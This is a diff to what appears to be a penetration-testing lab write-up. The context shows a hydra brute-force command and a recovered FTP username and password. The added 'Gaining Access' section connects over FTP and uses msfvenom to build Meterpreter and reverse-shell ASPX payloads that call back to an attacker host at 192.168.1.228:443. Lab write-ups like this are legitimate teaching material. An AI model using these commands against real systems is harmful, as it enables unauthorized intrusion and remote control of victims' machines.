@@ -79,10 +79,23 @@ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.t
 USER:    info
 PASSWD:  PolniyPizdec0211
 
+<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Gaining Access</h1>
+
 ### ** FTP Connection**
 ```bash
 ftp 192.168.1.180
 ```
 ![image](https://github.com/user-attachments/assets/deac17fa-b655-4e1a-b01d-190d7f24df61)
 
+We already have access via port 21, but in order to gain access to the machine we must upload our malicious file to obtain a more stable connection, remember that we are dealing with a windows machine but we do not know if it is 32 or 64 bits so we will have to create two files and upload them.
 
+Win 64bits
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.228 LPORT=443 -f aspx -o win64.aspx
+```
+
+Win 32bits
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.228 LPORT=443 -f aspx -o win32.aspx
+```
+![image](https://github.com/user-attachments/assets/e91d426c-427f-44ce-b8c1-67f685f5f5cd)
